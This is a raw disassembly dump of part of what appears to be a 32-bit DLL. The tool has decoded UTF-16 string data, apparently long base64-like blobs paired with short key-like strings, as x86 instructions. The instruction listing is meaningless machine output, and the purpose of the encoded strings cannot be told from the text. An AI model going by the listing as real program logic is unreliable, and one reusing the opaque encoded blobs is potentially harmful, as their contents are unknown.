100041b0:	00 5a 00             	add    %bl,0x0(%edx)
100041b3:	00 80 b9 53 00 30    	add    %al,0x300053b9(%eax)
100041b9:	00 4d 00             	add    %cl,0x0(%ebp)
100041bc:	78 00                	js     0x100041be
100041be:	63 00                	arpl   %eax,(%eax)
100041c0:	6b 00 39             	imul   $0x39,(%eax),%eax
100041c3:	00 42 00             	add    %al,0x0(%edx)
100041c6:	4f                   	dec    %edi
100041c7:	00 46 00             	add    %al,0x0(%esi)
100041ca:	52                   	push   %edx
100041cb:	00 77 00             	add    %dh,0x0(%edi)
100041ce:	4e                   	dec    %esi
100041cf:	00 57 00             	add    %dl,0x0(%edi)
100041d2:	46                   	inc    %esi
100041d3:	00 58 00             	add    %bl,0x0(%eax)
100041d6:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
100041da:	74 00                	je     0x100041dc
100041dc:	44                   	inc    %esp
100041dd:	00 4d 00             	add    %cl,0x0(%ebp)
100041e0:	58                   	pop    %eax
100041e1:	00 4a 00             	add    %cl,0x0(%edx)
100041e4:	50                   	push   %eax
100041e5:	00 51 00             	add    %dl,0x0(%ecx)
100041e8:	54                   	push   %esp
100041e9:	00 68 00             	add    %ch,0x0(%eax)
100041ec:	55                   	push   %ebp
100041ed:	00 63 00             	add    %ah,0x0(%ebx)
100041f0:	44                   	inc    %esp
100041f1:	00 56 00             	add    %dl,0x0(%esi)
100041f4:	4c                   	dec    %esp
100041f5:	00 51 00             	add    %dl,0x0(%ecx)
100041f8:	7a 00                	jp     0x100041fa
100041fa:	46                   	inc    %esi
100041fb:	00 79 00             	add    %bh,0x0(%ecx)
100041fe:	54                   	push   %esp
100041ff:	00 30                	add    %dh,(%eax)
10004201:	00 45 00             	add    %al,0x0(%ebp)
10004204:	34 00                	xor    $0x0,%al
10004206:	56                   	push   %esi
10004207:	00 48 00             	add    %cl,0x0(%eax)
1000420a:	41                   	inc    %ecx
1000420b:	00 31                	add    %dh,(%ecx)
1000420d:	00 61 00             	add    %ah,0x0(%ecx)
10004210:	47                   	inc    %edi
10004211:	00 4d 00             	add    %cl,0x0(%ebp)
10004214:	79 00                	jns    0x10004216
10004216:	53                   	push   %ebx
10004217:	00 30                	add    %dh,(%eax)
10004219:	00 4d 00             	add    %cl,0x0(%ebp)
1000421c:	78 00                	js     0x1000421e
1000421e:	63 00                	arpl   %eax,(%eax)
10004220:	6b 00 39             	imul   $0x39,(%eax),%eax
10004223:	00 42 00             	add    %al,0x0(%edx)
10004226:	4f                   	dec    %edi
10004227:	00 46 00             	add    %al,0x0(%esi)
1000422a:	52                   	push   %edx
1000422b:	00 77 00             	add    %dh,0x0(%edi)
1000422e:	4e                   	dec    %esi
1000422f:	00 55 00             	add    %dl,0x0(%ebp)
10004232:	74 00                	je     0x10004234
10004234:	44                   	inc    %esp
10004235:	00 4d 00             	add    %cl,0x0(%ebp)
10004238:	58                   	pop    %eax
10004239:	00 4a 00             	add    %cl,0x0(%edx)
1000423c:	50                   	push   %eax
1000423d:	00 51 00             	add    %dl,0x0(%ecx)
10004240:	54                   	push   %esp
10004241:	00 68 00             	add    %ch,0x0(%eax)
10004244:	55                   	push   %ebp
10004245:	00 63 00             	add    %ah,0x0(%ebx)
10004248:	44                   	inc    %esp
10004249:	00 55 00             	add    %dl,0x0(%ebp)
1000424c:	77 00                	ja     0x1000424e
1000424e:	50                   	push   %eax
1000424f:	00 55 00             	add    %dl,0x0(%ebp)
10004252:	74 00                	je     0x10004254
10004254:	44                   	inc    %esp
10004255:	00 4d 00             	add    %cl,0x0(%ebp)
10004258:	58                   	pop    %eax
10004259:	00 4a 00             	add    %cl,0x0(%edx)
1000425c:	50                   	push   %eax
1000425d:	00 51 00             	add    %dl,0x0(%ecx)
10004260:	54                   	push   %esp
10004261:	00 68 00             	add    %ch,0x0(%eax)
10004264:	55                   	push   %ebp
10004265:	00 63 00             	add    %ah,0x0(%ebx)
10004268:	44                   	inc    %esp
10004269:	00 55 00             	add    %dl,0x0(%ebp)
1000426c:	3d 00 00 15 4b       	cmp    $0x4b150000,%eax
10004271:	00 43 00             	add    %al,0x0(%ebx)
10004274:	31 00                	xor    %eax,(%eax)
10004276:	72 00                	jb     0x10004278
10004278:	4f                   	dec    %edi
10004279:	00 41 00             	add    %al,0x0(%ecx)
1000427c:	38 00                	cmp    %al,(%eax)
1000427e:	54                   	push   %esp
1000427f:	00 70 00             	add    %dh,0x0(%eax)
10004282:	35 00 00 80 f9       	xor    $0xf9800000,%eax
10004287:	53                   	push   %ebx
10004288:	00 6d 00             	add    %ch,0x0(%ebp)
1000428b:	6c                   	insb   (%dx),%es:(%edi)
1000428c:	00 71 00             	add    %dh,0x0(%ecx)
1000428f:	51                   	push   %ecx
10004290:	00 6a 00             	add    %ch,0x0(%edx)
10004293:	5a                   	pop    %edx
10004294:	00 43 00             	add    %al,0x0(%ebx)
10004297:	54                   	push   %esp
10004298:	00 45 00             	add    %al,0x0(%ebp)
1000429b:	5a                   	pop    %edx
1000429c:	00 31                	add    %dh,(%ecx)
1000429e:	00 55 00             	add    %dl,0x0(%ebp)
100042a1:	6c                   	insb   (%dx),%es:(%edi)
100042a2:	00 46 00             	add    %al,0x0(%esi)
100042a5:	59                   	pop    %ecx
100042a6:	00 51 00             	add    %dl,0x0(%ecx)
100042a9:	6b 00 70             	imul   $0x70,(%eax),%eax
100042ac:	00 70 00             	add    %dh,0x0(%eax)
100042af:	61                   	popa
100042b0:	00 6b 00             	add    %ch,0x0(%ebx)
100042b3:	49                   	dec    %ecx
100042b4:	00 32                	add    %dh,(%edx)
100042b6:	00 51 00             	add    %dl,0x0(%ecx)
100042b9:	6b 00 78             	imul   $0x78,(%eax),%eax
100042bc:	00 47 00             	add    %al,0x0(%edi)
100042bf:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
100042c3:	4a                   	dec    %edx
100042c4:	00 4b 00             	add    %cl,0x0(%ebx)
100042c7:	61                   	popa
100042c8:	00 57 00             	add    %dl,0x0(%edi)
100042cb:	70 00                	jo     0x100042cd
100042cd:	43                   	inc    %ebx
100042ce:	00 4e 00             	add    %cl,0x0(%esi)
100042d1:	6b 00 4a             	imul   $0x4a,(%eax),%eax
100042d4:	00 4d 00             	add    %cl,0x0(%ebp)
100042d7:	52                   	push   %edx
100042d8:	00 6e 00             	add    %ch,0x0(%esi)
100042db:	56                   	push   %esi
100042dc:	00 53 00             	add    %dl,0x0(%ebx)
100042df:	64 00 31             	add    %dh,%fs:(%ecx)
100042e2:	00 52 00             	add    %dl,0x0(%edx)
100042e5:	48                   	dec    %eax
100042e6:	00 53 00             	add    %dl,0x0(%ebx)
100042e9:	6d                   	insl   (%dx),%es:(%edi)
100042ea:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
100042ee:	00 51 00             	add    %dl,0x0(%ecx)
100042f1:	6a 00                	push   $0x0
100042f3:	5a                   	pop    %edx
100042f4:	00 43 00             	add    %al,0x0(%ebx)
100042f7:	54                   	push   %esp
100042f8:	00 45 00             	add    %al,0x0(%ebp)
100042fb:	5a                   	pop    %edx
100042fc:	00 31                	add    %dh,(%ecx)
100042fe:	00 55 00             	add    %dl,0x0(%ebp)
10004301:	6b 00 70             	imul   $0x70,(%eax),%eax
10004304:	00 70 00             	add    %dh,0x0(%eax)
10004307:	61                   	popa
10004308:	00 6b 00             	add    %ch,0x0(%ebx)
1000430b:	49                   	dec    %ecx
1000430c:	00 32                	add    %dh,(%edx)
1000430e:	00 51 00             	add    %dl,0x0(%ecx)
10004311:	6b 00 78             	imul   $0x78,(%eax),%eax
10004314:	00 47 00             	add    %al,0x0(%edi)
10004317:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
1000431b:	4a                   	dec    %edx
1000431c:	00 47 00             	add    %al,0x0(%edi)
1000431f:	4d                   	dec    %ebp
10004320:	00 57 00             	add    %dl,0x0(%edi)
10004323:	4a                   	dec    %edx
10004324:	00 4b 00             	add    %cl,0x0(%ebx)
10004327:	61                   	popa
10004328:	00 57 00             	add    %dl,0x0(%edi)
1000432b:	70 00                	jo     0x1000432d
1000432d:	43                   	inc    %ebx
1000432e:	00 4e 00             	add    %cl,0x0(%esi)
10004331:	6b 00 4a             	imul   $0x4a,(%eax),%eax
10004334:	00 4d 00             	add    %cl,0x0(%ebp)
10004337:	52                   	push   %edx
10004338:	00 6e 00             	add    %ch,0x0(%esi)
1000433b:	56                   	push   %esi
1000433c:	00 53 00             	add    %dl,0x0(%ebx)
1000433f:	53                   	push   %ebx
10004340:	00 6d 00             	add    %ch,0x0(%ebp)
10004343:	6c                   	insb   (%dx),%es:(%edi)
10004344:	00 71 00             	add    %dh,0x0(%ecx)
10004347:	51                   	push   %ecx
10004348:	00 6a 00             	add    %ch,0x0(%edx)
1000434b:	5a                   	pop    %edx
1000434c:	00 43 00             	add    %al,0x0(%ebx)
1000434f:	54                   	push   %esp
10004350:	00 45 00             	add    %al,0x0(%ebp)
10004353:	5a                   	pop    %edx
10004354:	00 31                	add    %dh,(%ecx)
10004356:	00 55 00             	add    %dl,0x0(%ebp)
10004359:	6d                   	insl   (%dx),%es:(%edi)
1000435a:	00 31                	add    %dh,(%ecx)
1000435c:	00 4f 00             	add    %cl,0x0(%edi)
1000435f:	62 00                	bound  %eax,(%eax)
10004361:	30 00                	xor    %al,(%eax)
10004363:	70 00                	jo     0x10004365
10004365:	70 00                	jo     0x10004367
10004367:	61                   	popa
10004368:	00 6b 00             	add    %ch,0x0(%ebx)
1000436b:	49                   	dec    %ecx
1000436c:	00 32                	add    %dh,(%edx)
1000436e:	00 51 00             	add    %dl,0x0(%ecx)
10004371:	6b 00 78             	imul   $0x78,(%eax),%eax
10004374:	00 47 00             	add    %al,0x0(%edi)
10004377:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
1000437b:	49                   	dec    %ecx
1000437c:	00 3d 00 00 15 4a    	add    %bh,0x4a150000
10004382:	00 69 00             	add    %ch,0x0(%ecx)
10004385:	6a 00                	push   $0x0
10004387:	42                   	inc    %edx
10004388:	00 36                	add    %dh,(%esi)
1000438a:	00 42 00             	add    %al,0x0(%edx)
1000438d:	4c                   	dec    %esp
1000438e:	00 46 00             	add    %al,0x0(%esi)
10004391:	75 00                	jne    0x10004393
10004393:	52                   	push   %edx
10004394:	00 00                	add    %al,(%eax)
10004396:	79 62                	jns    0x100043fa
10004398:	00 44 00 4e          	add    %al,0x4e(%eax,%eax,1)
1000439c:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
100043a0:	00 7a 00             	add    %bh,0x0(%edx)
100043a3:	56                   	push   %esi
100043a4:	00 52 00             	add    %dl,0x0(%edx)
100043a7:	61                   	popa
100043a8:	00 56 00             	add    %dl,0x0(%esi)
100043ab:	42                   	inc    %edx
100043ac:	00 75 00             	add    %dh,0x0(%ebp)
100043af:	4e                   	dec    %esi
100043b0:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
100043b4:	00 7a 00             	add    %bh,0x0(%edx)
100043b7:	54                   	push   %esp
100043b8:	00 6d 00             	add    %ch,0x0(%ebp)
100043bb:	77 00                	ja     0x100043bd
100043bd:	7a 00                	jp     0x100043bf
100043bf:	62 00                	bound  %eax,(%eax)
100043c1:	55                   	push   %ebp
100043c2:	00 73 00             	add    %dh,0x0(%ebx)
100043c5:	31 00                	xor    %eax,(%eax)
100043c7:	55                   	push   %ebp
100043c8:	00 57 00             	add    %dl,0x0(%edi)
100043cb:	6c                   	insb   (%dx),%es:(%edi)
100043cc:	00 51 00             	add    %dl,0x0(%ecx)
100043cf:	62 00                	bound  %eax,(%eax)
100043d1:	6a 00                	push   $0x0
100043d3:	5a                   	pop    %edx
100043d4:	00 73 00             	add    %dh,0x0(%ebx)
100043d7:	4d                   	dec    %ebp
100043d8:	00 32                	add    %dh,(%edx)
100043da:	00 31                	add    %dh,(%ecx)
100043dc:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
100043e0:	00 56 00             	add    %dl,0x0(%esi)
100043e3:	46                   	inc    %esi
100043e4:	00 70 00             	add    %dh,0x0(%eax)
100043e7:	55                   	push   %ebp
100043e8:	00 47 00             	add    %al,0x0(%edi)
100043eb:	34 00                	xor    $0x0,%al
100043ed:	32 00                	xor    (%eax),%al
100043ef:	61                   	popa
100043f0:	00 6d 00             	add    %ch,0x0(%ebp)
100043f3:	77 00                	ja     0x100043f5
100043f5:	7a 00                	jp     0x100043f7
100043f7:	62 00                	bound  %eax,(%eax)
100043f9:	55                   	push   %ebp
100043fa:	00 73 00             	add    %dh,0x0(%ebx)
100043fd:	31 00                	xor    %eax,(%eax)
100043ff:	55                   	push   %ebp
10004400:	00 57 00             	add    %dl,0x0(%edi)
10004403:	6c                   	insb   (%dx),%es:(%edi)
10004404:	00 51 00             	add    %dl,0x0(%ecx)
10004407:	62 00                	bound  %eax,(%eax)
10004409:	6a 00                	push   $0x0
1000440b:	59                   	pop    %ecx
1000440c:	00 3d 00 00 15 6c    	add    %bh,0x6c150000
10004412:	00 33                	add    %dh,(%ebx)
10004414:	00 6d 00             	add    %ch,0x0(%ebp)
10004417:	4b                   	dec    %ebx
10004418:	00 35 00 51 00 69    	add    %dh,0x69005100
1000441e:	00 50 00             	add    %dl,0x0(%eax)
10004421:	6e                   	outsb  %ds:(%esi),(%dx)
10004422:	00 36                	add    %dh,(%esi)
10004424:	00 00                	add    %al,(%eax)
10004426:	81 71 5a 00 6b 00 31 	xorl   $0x31006b00,0x5a(%ecx)
1000442d:	00 46 00             	add    %al,0x0(%esi)
10004430:	59                   	pop    %ecx
10004431:	00 7a 00             	add    %bh,0x0(%edx)
10004434:	6c                   	insb   (%dx),%es:(%edi)
10004435:	00 76 00             	add    %dh,0x0(%esi)
10004438:	4e                   	dec    %esi
10004439:	00 45 00             	add    %al,0x0(%ebp)
1000443c:	63 00                	arpl   %eax,(%eax)
1000443e:	34 00                	xor    $0x0,%al
10004440:	63 00                	arpl   %eax,(%eax)
10004442:	56                   	push   %esi
10004443:	00 4e 00             	add    %cl,0x0(%esi)
10004446:	58                   	pop    %eax
10004447:	00 4e 00             	add    %cl,0x0(%esi)
1000444a:	57                   	push   %edi
1000444b:	00 5a 00             	add    %bl,0x0(%edx)
1000444e:	4e                   	dec    %esi
1000444f:	00 52 00             	add    %dl,0x0(%edx)
10004452:	57                   	push   %edi
10004453:	00 4d 00             	add    %cl,0x0(%ebp)
10004456:	35 00 62 00 7a       	xor    $0x7a006200,%eax
1000445b:	00 52 00             	add    %dl,0x0(%edx)
1000445e:	48                   	dec    %eax
1000445f:	00 4f 00             	add    %cl,0x0(%edi)
10004462:	48                   	dec    %eax
10004463:	00 46 00             	add    %al,0x0(%esi)
10004466:	6d                   	insl   (%dx),%es:(%edi)
10004467:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
1000446b:	00 56 00             	add    %dl,0x0(%esi)
1000446e:	6a 00                	push   $0x0
10004470:	4f                   	dec    %edi
10004471:	00 57 00             	add    %dl,0x0(%edi)
10004474:	38 00                	cmp    %al,(%eax)
10004476:	30 00                	xor    %al,(%eax)
10004478:	52                   	push   %edx
10004479:	00 7a 00             	add    %bh,0x0(%edx)
1000447c:	68 00 78 00 65       	push   $0x65007800
10004481:	00 6d 00             	add    %ch,0x0(%ebp)
10004484:	52                   	push   %edx
10004485:	00 48 00             	add    %cl,0x0(%eax)
10004488:	5a                   	pop    %edx
10004489:	00 6b 00             	add    %ch,0x0(%ebx)
1000448c:	31 00                	xor    %eax,(%eax)
1000448e:	46                   	inc    %esi
1000448f:	00 59 00             	add    %bl,0x0(%ecx)
10004492:	7a 00                	jp     0x10004494
10004494:	6c                   	insb   (%dx),%es:(%edi)
10004495:	00 76 00             	add    %dh,0x0(%esi)
10004498:	4e                   	dec    %esi
10004499:	00 45 00             	add    %al,0x0(%ebp)
1000449c:	63 00                	arpl   %eax,(%eax)
1000449e:	34 00                	xor    $0x0,%al
100044a0:	63 00                	arpl   %eax,(%eax)
100044a2:	57                   	push   %edi
100044a3:	00 5a 00             	add    %bl,0x0(%edx)
100044a6:	4e                   	dec    %esi
100044a7:	00 52 00             	add    %dl,0x0(%edx)
100044aa:	57                   	push   %edi
100044ab:	00 4d 00             	add    %cl,0x0(%ebp)
100044ae:	35 00 62 00 7a       	xor    $0x7a006200,%eax
100044b3:	00 52 00             	add    %dl,0x0(%edx)
100044b6:	48                   	dec    %eax
100044b7:	00 4f 00             	add    %cl,0x0(%edi)
100044ba:	48                   	dec    %eax
100044bb:	00 46 00             	add    %al,0x0(%esi)
100044be:	47                   	inc    %edi
100044bf:	00 63 00             	add    %ah,0x0(%ebx)
100044c2:	32 00                	xor    (%eax),%al
100044c4:	4a                   	dec    %edx
100044c5:	00 6d 00             	add    %ch,0x0(%ebp)
100044c8:	54                   	push   %esp
100044c9:	00 55 00             	add    %dl,0x0(%ebp)
100044cc:	56                   	push   %esi
100044cd:	00 6a 00             	add    %ch,0x0(%edx)
100044d0:	4f                   	dec    %edi
100044d1:	00 57 00             	add    %dl,0x0(%edi)
100044d4:	38 00                	cmp    %al,(%eax)
100044d6:	30 00                	xor    %al,(%eax)
100044d8:	52                   	push   %edx
100044d9:	00 7a 00             	add    %bh,0x0(%edx)
100044dc:	68 00 78 00 5a       	push   $0x5a007800
100044e1:	00 6b 00             	add    %ch,0x0(%ebx)
100044e4:	31 00                	xor    %eax,(%eax)
100044e6:	46                   	inc    %esi
100044e7:	00 59 00             	add    %bl,0x0(%ecx)
100044ea:	7a 00                	jp     0x100044ec
100044ec:	6c                   	insb   (%dx),%es:(%edi)
100044ed:	00 76 00             	add    %dh,0x0(%esi)
100044f0:	4e                   	dec    %esi
100044f1:	00 45 00             	add    %al,0x0(%ebp)
100044f4:	63 00                	arpl   %eax,(%eax)
100044f6:	34 00                	xor    $0x0,%al
100044f8:	63 00                	arpl   %eax,(%eax)
100044fa:	55                   	push   %ebp
100044fb:	00 5a 00             	add    %bl,0x0(%edx)
100044fe:	57                   	push   %edi
100044ff:	00 4d 00             	add    %cl,0x0(%ebp)
10004502:	47                   	inc    %edi
10004503:	00 5a 00             	add    %bl,0x0(%edx)
10004506:	4e                   	dec    %esi
10004507:	00 52 00             	add    %dl,0x0(%edx)
1000450a:	57                   	push   %edi
1000450b:	00 4d 00             	add    %cl,0x0(%ebp)
1000450e:	35 00 62 00 7a       	xor    $0x7a006200,%eax
10004513:	00 52 00             	add    %dl,0x0(%edx)
10004516:	48                   	dec    %eax
10004517:	00 4f 00             	add    %cl,0x0(%edi)
1000451a:	48                   	dec    %eax
1000451b:	00 46 00             	add    %al,0x0(%esi)
1000451e:	6d                   	insl   (%dx),%es:(%edi)
1000451f:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
10004523:	00 56 00             	add    %dl,0x0(%esi)
10004526:	6a 00                	push   $0x0
10004528:	4f                   	dec    %edi
10004529:	00 57 00             	add    %dl,0x0(%edi)
1000452c:	38 00                	cmp    %al,(%eax)
1000452e:	30 00                	xor    %al,(%eax)
10004530:	52                   	push   %edx
10004531:	00 7a 00             	add    %bh,0x0(%edx)
10004534:	68 00 78 00 59       	push   $0x59007800
10004539:	00 56 00             	add    %dl,0x0(%esi)
1000453c:	64 00 33             	add    %dh,%fs:(%ebx)
1000453f:	00 5a 00             	add    %bl,0x0(%edx)
10004542:	6b 00 31             	imul   $0x31,(%eax),%eax
10004545:	00 46 00             	add    %al,0x0(%esi)
10004548:	59                   	pop    %ecx
10004549:	00 7a 00             	add    %bh,0x0(%edx)
1000454c:	6c                   	insb   (%dx),%es:(%edi)
1000454d:	00 76 00             	add    %dh,0x0(%esi)
10004550:	4e                   	dec    %esi
10004551:	00 45 00             	add    %al,0x0(%ebp)
10004554:	63 00                	arpl   %eax,(%eax)
10004556:	34 00                	xor    $0x0,%al
10004558:	63 00                	arpl   %eax,(%eax)
1000455a:	57                   	push   %edi
1000455b:	00 5a 00             	add    %bl,0x0(%edx)
1000455e:	4e                   	dec    %esi
1000455f:	00 52 00             	add    %dl,0x0(%edx)
10004562:	57                   	push   %edi
10004563:	00 4d 00             	add    %cl,0x0(%ebp)
10004566:	35 00 62 00 7a       	xor    $0x7a006200,%eax
1000456b:	00 52 00             	add    %dl,0x0(%edx)
1000456e:	48                   	dec    %eax
1000456f:	00 4f 00             	add    %cl,0x0(%edi)
10004572:	48                   	dec    %eax
10004573:	00 45 00             	add    %al,0x0(%ebp)
10004576:	39 00                	cmp    %eax,(%eax)
10004578:	5a                   	pop    %edx
10004579:	00 6b 00             	add    %ch,0x0(%ebx)
1000457c:	31 00                	xor    %eax,(%eax)
1000457e:	46                   	inc    %esi
1000457f:	00 59 00             	add    %bl,0x0(%ecx)
10004582:	7a 00                	jp     0x10004584
10004584:	6c                   	insb   (%dx),%es:(%edi)
10004585:	00 76 00             	add    %dh,0x0(%esi)
10004588:	4e                   	dec    %esi
10004589:	00 45 00             	add    %al,0x0(%ebp)
1000458c:	63 00                	arpl   %eax,(%eax)
1000458e:	34 00                	xor    $0x0,%al
10004590:	63 00                	arpl   %eax,(%eax)
10004592:	51                   	push   %ecx
10004593:	00 3d 00 3d 00 00    	add    %bh,0x3d00
10004599:	15 66 00 4d 00       	adc    $0x4d0066,%eax
1000459e:	45                   	inc    %ebp
1000459f:	00 63 00             	add    %ah,0x0(%ebx)
100045a2:	39 00                	cmp    %eax,(%eax)
100045a4:	6f                   	outsl  %ds:(%esi),(%dx)
100045a5:	00 34 00             	add    %dh,(%eax,%eax,1)
100045a8:	47                   	inc    %edi
100045a9:	00 38                	add    %bh,(%eax)
100045ab:	00 71 00             	add    %dh,0x0(%ecx)
100045ae:	00 80 f9 61 00 55    	add    %al,0x550061f9(%eax)
100045b4:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
100045b8:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
100045bc:	00 35 00 47 00 56    	add    %dh,0x56004700
100045c2:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
100045c6:	00 34 00             	add    %dh,(%eax,%eax,1)
100045c9:	63 00                	arpl   %eax,(%eax)
100045cb:	47                   	inc    %edi
100045cc:	00 4a 00             	add    %cl,0x0(%edx)
100045cf:	74 00                	je     0x100045d1
100045d1:	5a                   	pop    %edx
100045d2:	00 47 00             	add    %al,0x0(%edi)
100045d5:	6c                   	insb   (%dx),%es:(%edi)
100045d6:	00 4a 00             	add    %cl,0x0(%edx)
100045d9:	61                   	popa
100045da:	00 48 00             	add    %cl,0x0(%eax)
100045dd:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
100045e1:	52                   	push   %edx
100045e2:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100045e6:	00 7a 00             	add    %bh,0x0(%edx)
100045e9:	4f                   	dec    %edi
100045ea:	00 48 00             	add    %cl,0x0(%eax)
100045ed:	42                   	inc    %edx
100045ee:	00 70 00             	add    %dh,0x0(%eax)
100045f1:	53                   	push   %ebx
100045f2:	00 57 00             	add    %dl,0x0(%edi)
100045f5:	68 00 33 00 54       	push   $0x54003300
100045fa:	00 6b 00             	add    %ch,0x0(%ebx)
100045fd:	5a                   	pop    %edx
100045fe:	00 55 00             	add    %dl,0x0(%ebp)
10004601:	4d                   	dec    %ebp
10004602:	00 7a 00             	add    %bh,0x0(%edx)
10004605:	68 00 77 00 62       	push   $0x62007700
1000460a:	00 47 00             	add    %al,0x0(%edi)
1000460d:	4a                   	dec    %edx
1000460e:	00 75 00             	add    %dh,0x0(%ebp)
10004611:	61                   	popa
10004612:	00 55 00             	add    %dl,0x0(%ebp)
10004615:	6c                   	insb   (%dx),%es:(%edi)
10004616:	00 6f 00             	add    %ch,0x0(%edi)
10004619:	64 00 30             	add    %dh,%fs:(%eax)
1000461c:	00 35 00 47 00 56    	add    %dh,0x56004700
10004622:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
10004626:	00 34 00             	add    %dh,(%eax,%eax,1)
10004629:	63 00                	arpl   %eax,(%eax)
1000462b:	47                   	inc    %edi
1000462c:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
10004630:	00 61 00             	add    %ah,0x0(%ecx)
10004633:	48                   	dec    %eax
10004634:	00 64 00 4f          	add    %ah,0x4f(%eax,%eax,1)
10004638:	00 52 00             	add    %dl,0x0(%edx)
1000463b:	6c                   	insb   (%dx),%es:(%edi)
1000463c:	00 51 00             	add    %dl,0x0(%ecx)
1000463f:	7a 00                	jp     0x10004641
10004641:	4f                   	dec    %edi
10004642:	00 48 00             	add    %cl,0x0(%eax)
10004645:	42                   	inc    %edx
10004646:	00 53 00             	add    %dl,0x0(%ebx)
10004649:	61                   	popa
1000464a:	00 47 00             	add    %al,0x0(%edi)
1000464d:	4e                   	dec    %esi
1000464e:	00 70 00             	add    %dh,0x0(%eax)
10004651:	53                   	push   %ebx
10004652:	00 57 00             	add    %dl,0x0(%edi)
10004655:	68 00 33 00 54       	push   $0x54003300
1000465a:	00 6b 00             	add    %ch,0x0(%ebx)
1000465d:	5a                   	pop    %edx
1000465e:	00 55 00             	add    %dl,0x0(%ebp)
10004661:	4d                   	dec    %ebp
10004662:	00 7a 00             	add    %bh,0x0(%edx)
10004665:	68 00 77 00 61       	push   $0x61007700
1000466a:	00 55 00             	add    %dl,0x0(%ebp)
1000466d:	6c                   	insb   (%dx),%es:(%edi)
1000466e:	00 6f 00             	add    %ch,0x0(%edi)
10004671:	64 00 30             	add    %dh,%fs:(%eax)
10004674:	00 35 00 47 00 56    	add    %dh,0x56004700
1000467a:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
1000467e:	00 34 00             	add    %dh,(%eax,%eax,1)
10004681:	63 00                	arpl   %eax,(%eax)
10004683:	44                   	inc    %esp
10004684:	00 4a 00             	add    %cl,0x0(%edx)
10004687:	7a 00                	jp     0x10004689
10004689:	50                   	push   %eax
1000468a:	00 57 00             	add    %dl,0x0(%edi)
1000468d:	6c                   	insb   (%dx),%es:(%edi)
1000468e:	00 4a 00             	add    %cl,0x0(%edx)
10004691:	61                   	popa
10004692:	00 48 00             	add    %cl,0x0(%eax)
10004695:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
10004699:	52                   	push   %edx
1000469a:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
1000469e:	00 7a 00             	add    %bh,0x0(%edx)
100046a1:	4f                   	dec    %edi
100046a2:	00 48 00             	add    %cl,0x0(%eax)
100046a5:	41                   	inc    %ecx
100046a6:	00 3d 00 00 15 69    	add    %bh,0x69150000
100046ac:	00 49 00             	add    %cl,0x0(%ecx)
100046af:	68 00 77 00 4e       	push   $0x4e007700
100046b4:	00 46 00             	add    %al,0x0(%esi)
100046b7:	54                   	push   %esp
100046b8:	00 33                	add    %dh,(%ebx)
100046ba:	00 38                	add    %bh,(%eax)
100046bc:	00 70 00             	add    %dh,0x0(%eax)
100046bf:	00 85 81 54 00 58    	add    %al,0x58005481(%ebp)
100046c5:	00 70 00             	add    %dh,0x0(%eax)
100046c8:	72 00                	jb     0x100046ca
100046ca:	5a                   	pop    %edx
100046cb:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
100046cf:	00 32                	add    %dh,(%edx)
100046d1:	00 61 00             	add    %ah,0x0(%ecx)
100046d4:	6b 00 46             	imul   $0x46,(%eax),%eax
100046d7:	00 71 00             	add    %dh,0x0(%ecx)
100046da:	52                   	push   %edx
100046db:	00 56 00             	add    %dl,0x0(%esi)
100046de:	46                   	inc    %esi
100046df:	00 36                	add    %dh,(%esi)
100046e1:	00 63 00             	add    %ah,0x0(%ebx)
100046e4:	45                   	inc    %ebp
100046e5:	00 31                	add    %dh,(%ecx)
100046e7:	00 36                	add    %dh,(%esi)
100046e9:	00 61 00             	add    %ah,0x0(%ecx)
100046ec:	32 00                	xor    (%eax),%al
100046ee:	5a                   	pop    %edx
100046ef:	00 55 00             	add    %dl,0x0(%ebp)
100046f2:	4e                   	dec    %esi
100046f3:	00 6d 00             	add    %ch,0x0(%ebp)
100046f6:	70 00                	jo     0x100046f8
100046f8:	42                   	inc    %edx
100046f9:	00 61 00             	add    %ah,0x0(%ecx)
100046fc:	6b 00 56             	imul   $0x56,(%eax),%eax
100046ff:	00 4e 00             	add    %cl,0x0(%esi)
10004702:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
10004706:	74 00                	je     0x10004708
10004708:	6d                   	insl   (%dx),%es:(%edi)
10004709:	00 56 00             	add    %dl,0x0(%esi)
1000470c:	44                   	inc    %esp
1000470d:	00 5a 00             	add    %bl,0x0(%edx)
10004710:	71 00                	jno    0x10004712
10004712:	51                   	push   %ecx
10004713:	00 57 00             	add    %dl,0x0(%edi)
10004716:	70 00                	jo     0x10004718
10004718:	46                   	inc    %esi
10004719:	00 59 00             	add    %bl,0x0(%ecx)
1000471c:	31 00                	xor    %eax,(%eax)
1000471e:	68 00 47 00 54       	push   $0x54004700
10004723:	00 58 00             	add    %bl,0x0(%eax)
10004726:	70 00                	jo     0x10004728
10004728:	72 00                	jb     0x1000472a
1000472a:	5a                   	pop    %edx
1000472b:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
1000472f:	00 32                	add    %dh,(%edx)
10004731:	00 61 00             	add    %ah,0x0(%ecx)
10004734:	6b 00 46             	imul   $0x46,(%eax),%eax
10004737:	00 71 00             	add    %dh,0x0(%ecx)
1000473a:	52                   	push   %edx
1000473b:	00 55 00             	add    %dl,0x0(%ebp)
1000473e:	31 00                	xor    %eax,(%eax)
10004740:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
10004744:	32 00                	xor    (%eax),%al
10004746:	5a                   	pop    %edx
10004747:	00 55 00             	add    %dl,0x0(%ebp)
1000474a:	4e                   	dec    %esi
